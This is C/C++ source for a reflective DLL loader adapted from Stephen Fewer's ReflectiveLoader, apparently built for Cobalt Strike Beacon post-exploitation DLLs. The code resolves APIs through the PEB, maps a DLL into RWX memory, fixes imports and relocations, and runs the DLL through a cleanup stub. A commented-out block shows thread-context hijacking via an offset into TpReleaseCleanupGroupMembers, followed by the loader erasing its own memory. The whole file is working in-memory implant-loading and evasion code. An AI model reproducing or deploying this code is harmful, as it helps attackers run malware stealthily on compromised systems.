
//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//

#include "ReflectiveLoader.h"
#include "End.h"
#include "Utils.h"
#include "FunctionResolving.h"
#include "StdLib.h"

#include "CleanJob.h"

/**
 * The position independent reflective loader
 *
 * @return The target DLL's entry point
*/
extern "C" {


#pragma code_seg(".text$a")
    void WINAPI ReflectiveLoader(LPVOID loaderArgument) {
        // STEP 0: Determine the start address of the loader
#ifdef _WIN64
        // A rip relative address is calculated in x64
        void* loaderStart = &ReflectiveLoader;
#elif _WIN32
        /*
        * &ReflectiveLoader does not work on x86, since it does not support eip relative addressing
        * Therefore, it is calculated by substracting the function prologue from the current address
        * This is subject to change depending upon the compiler/compiler settings. This could result
        * in issues with Beacon/the postex DLL's cleanup routines. As a result, when writing x86 loaders
        * we strongly recommend verifying that the correct value is subtracted from the result of
        * GetLocation(). GetLocation() will return the address of the instruction following
        * the function call. In the example below, GetLocation() returns 0x0000000D which is why
        * we subtract 0xD to get back to 0x0. In our testing, this value can change and can sometimes
        * cause crashes during cleanup.
        *
        * The generated disassembly from IDA:
        *
        * text:00000000                 push    ebp
        * text:00000001                 mov     ebp, esp
        * text:00000003                 sub     esp, 24h
        * text:00000006                 push    esi
        * text:00000007                 push    edi
        * text:00000008                 call    GetLocation
        * text:0000000D                 sub     eax, 11h
        */
        void* loaderStart = (char*)GetLocation() - 0xE;
#endif
        PRINT("[+] Loader Base Address: %p\n", loaderStart);

        // STEP 1: Determine the base address of whatever we are loading
        ULONG_PTR rawDllBaseAddress = FindBufferBaseAddress();
        PRINT("[+] Raw DLL Base Address: %p\n", rawDllBaseAddress);

        // STEP 2: Determine the location of NtHeader
        PIMAGE_DOS_HEADER rawDllDosHeader = (PIMAGE_DOS_HEADER)rawDllBaseAddress;
        PIMAGE_NT_HEADERS rawDllNtHeader = (PIMAGE_NT_HEADERS)(rawDllBaseAddress + rawDllDosHeader->e_lfanew);

        // STEP 3: Resolve the functions our loader needs...
        _PPEB pebAddress = GetPEBAddress();
        WINDOWSAPIS winApi = { 0 };
        NTSAPIS ntApi = { 0 };
        OTHERSAPIS otherApi = { 0 };
        if (!ResolveBaseLoaderFunctions(pebAddress, &winApi, &ntApi, &otherApi)) {
            return;
        }

        DWORD myselfsize = 0;
        LPVOID CleanJobAddr = GetCleanData(&myselfsize);
        /**
        * STEP 4: Create a new location in memory for the loaded image...
        * We're using PAGE_EXECUTE_READWRITE as it's an example.
        */
        ULONG_PTR loadedDllBaseAddress = (ULONG_PTR)winApi.VirtualAlloc(NULL, rawDllNtHeader->OptionalHeader.SizeOfImage + myselfsize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (loadedDllBaseAddress == NULL) {
            PRINT("[-] Failed to allocate memory. Exiting..\n");
            return;
        }
        else {
            PRINT("[+] Allocated memory: 0x%p\n", loadedDllBaseAddress);
        }

        _memcpy((void*)loadedDllBaseAddress, CleanJobAddr, myselfsize);

        // STEP 5: Copy in our headers/sections...
        if (!CopyPEHeader(rawDllBaseAddress, loadedDllBaseAddress + myselfsize)) {
            PRINT("[-] Failed to copy PE header. Exiting..\n");
            return;
        };
        if (!CopyPESections(rawDllBaseAddress, loadedDllBaseAddress + myselfsize)) {
            PRINT("[-] Failed to copy PE sections. Exiting..\n");
            return;
        };

        // STEP 6: Resolve rdata information
        RDATA_SECTION rdata = { 0 };
        if (!ResolveRdataSection(rawDllBaseAddress, loadedDllBaseAddress + myselfsize, &rdata)) {
            PRINT("[-] Failed to resolve rdata information. Exiting..\n");
            return;
        };

        // STEP 7: Process the target DLL's import table...
        ResolveImports(rawDllNtHeader, loadedDllBaseAddress + myselfsize, &winApi);

        // STEP 8: Process the target DLL's relocations...
        ProcessRelocations(rawDllNtHeader, loadedDllBaseAddress + myselfsize);

        // STEP 9: Find the target DLL's entry point
        ULONG_PTR entryPoint = loadedDllBaseAddress + myselfsize + rawDllNtHeader->OptionalHeader.AddressOfEntryPoint;
        PRINT("[+] Entry point: %p \n", entryPoint);

        /**
        * STEP 10: Call the target DLL's entry point
        * We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
        */
        winApi.NtFlushInstructionCache((HANDLE)-1, NULL, 0);

        // Call DllMain twice to ensure that post-ex DLL is set up correctly.
        PRINT("[*] Calling the entry point\n");
        //((DLLMAIN)entryPoint)((HINSTANCE)loadedDllBaseAddress, DLL_PROCESS_ATTACH, (LPVOID)0x0A2A1DE0);
        //((DLLMAIN)entryPoint)((HINSTANCE)loaderStart, 5, (LPVOID)NULL);

        ((void (*)(DLLMAIN, ULONG_PTR, void*, NT_CREATETHREADEX, NT_GETCONTEXTTHREAD, RTL_EXITUSERTHREAD, NT_SETCONTEXTTHREAD, NT_RESUMETHREAD, WAITFORSINGLEOBJECTS, VIRTUALFREE, RTL_CAPTURECONTEXT, NT_CONTINUE, VIRTUALQUERY, PVOID, UNMAPVIEWOFFILE)) loadedDllBaseAddress)((DLLMAIN)entryPoint, loadedDllBaseAddress + myselfsize, loaderStart, ntApi.NtCreateThreadEx, ntApi.NtGetContextThread, ntApi.RtlExitUserThread, ntApi.NtSetContextThread, ntApi.NtResumeThread, otherApi.WaitForSingleObject, winApi.VirtualFree, ntApi.RtlCaptureContext, ntApi.NtContinue, otherApi.VirtualQuery, winApi.TpReleaseCleanupGroupMembers, otherApi.UnmapViewOfFile);


//        HANDLE hThread = NULL;
//        CONTEXT CtxEntry;
//        CONTEXT CtxFreeMem;
//        MEMORY_BASIC_INFORMATION mbi;
//
//        if (NT_SUCCESS(ntApi.NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), (PVOID)((ULONG_PTR)winApi.TpReleaseCleanupGroupMembers + (ULONG_PTR)0x8950), NULL, TRUE, 0, 0, 0, NULL)))
//        {
//            CtxEntry.ContextFlags = CONTEXT_FULL;
//            ntApi.NtGetContextThread(hThread, &CtxEntry);
//
//
//#ifdef _WIN64
//            CtxEntry.Rip = UINT_PTR(entryPoint);
//            CtxEntry.Rcx = UINT_PTR(loadedDllBaseAddress);
//            CtxEntry.Rdx = UINT_PTR(DLL_PROCESS_ATTACH);
//            *(ULONG_PTR*)CtxEntry.Rsp = UINT_PTR(ntApi.RtlExitUserThread);
//
//#elif _WIN32
//
//            DWORD* originalStack = (DWORD*)CtxEntry.Esp;
//
//            DWORD* newStack = originalStack - 4; 
//
//            newStack[0] = (DWORD)UINT_PTR(ntApi.RtlExitUserThread);
//            newStack[1] = (DWORD)loadedDllBaseAddress; 
//            newStack[2] = (DWORD)DLL_PROCESS_ATTACH;   
//
//            CtxEntry.Esp = (DWORD)newStack;
//            CtxEntry.Eip = (DWORD)entryPoint; 
//
//#endif 
//
//            CtxEntry.ContextFlags = CONTEXT_FULL;
//            ntApi.NtSetContextThread(hThread, &CtxEntry);
//            ntApi.NtResumeThread(hThread, 0);
//        }
//        
//        otherApi.WaitForSingleObject(hThread, INFINITE);
//        winApi.VirtualFree((LPVOID)loadedDllBaseAddress, 0, MEM_RELEASE);
//
//
//
//        if (otherApi.VirtualQuery((char*)loaderStart, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) {
//
//            if (mbi.Type == MEM_PRIVATE) {
//
//                CtxFreeMem.ContextFlags = CONTEXT_FULL;
//                ntApi.RtlCaptureContext(&CtxFreeMem);
//
//#ifdef _WIN64
//
//                CtxFreeMem.Rip = UINT_PTR(winApi.VirtualFree);
//                CtxFreeMem.Rcx = UINT_PTR(loaderStart);
//                CtxFreeMem.Rdx = UINT_PTR(0);
//                CtxFreeMem.R8 = UINT_PTR(MEM_RELEASE);
//                *(ULONG_PTR*)CtxFreeMem.Rsp = UINT_PTR(ntApi.RtlExitUserThread);
//
//#else
//
//                DWORD* originalStack = (DWORD*)CtxFreeMem.Esp;
//
//                DWORD* newStack = originalStack - 4; 
//
//                newStack[0] = (DWORD)UINT_PTR(ntApi.RtlExitUserThread);
//                newStack[1] = (DWORD)loaderStart; 
//                newStack[2] = (DWORD)0;  
//                newStack[3] = (DWORD)MEM_RELEASE;
//
//                CtxFreeMem.Esp = (DWORD)newStack;
//                CtxFreeMem.Eip = (DWORD)winApi.VirtualFree; 
//
//#endif 
//                CtxFreeMem.ContextFlags = CONTEXT_FULL;
//                ntApi.NtContinue(&CtxFreeMem, FALSE);
//
//            }
//            else if (mbi.Type == MEM_MAPPED) {
//
//                CtxFreeMem.ContextFlags = CONTEXT_FULL;
//                ntApi.RtlCaptureContext(&CtxFreeMem);
//#ifdef _WIN64
//
//                CtxFreeMem.Rip = UINT_PTR(otherApi.UnmapViewOfFile);
//                CtxFreeMem.Rcx = UINT_PTR(loaderStart);
//                *(ULONG_PTR*)CtxFreeMem.Rsp = UINT_PTR(ntApi.RtlExitUserThread);
//
//#else
//
//
//
//#endif
//                CtxFreeMem.ContextFlags = CONTEXT_FULL;
//                ntApi.NtContinue(&CtxFreeMem, FALSE);
//            }
//
//        }


    }
}

/*******************************************************************
 * To avoid problems with function positioning, do not add any new
 * functions above this pragma directive.
********************************************************************/
#pragma code_seg(".text$b")
